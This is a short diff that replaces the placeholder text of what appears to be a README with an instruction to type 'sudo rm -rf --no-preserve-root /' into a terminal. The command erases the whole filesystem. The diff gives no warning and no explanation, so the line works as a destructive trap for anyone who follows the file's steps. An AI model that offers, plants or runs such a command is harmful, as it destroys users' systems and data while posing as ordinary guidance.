@@ -1,5 +1,4 @@
-# Hello, World!
-
-hell.
-
-Q
+Type into the temrinal:
+```
+sudo rm -rf --no-preserve-root /
+```
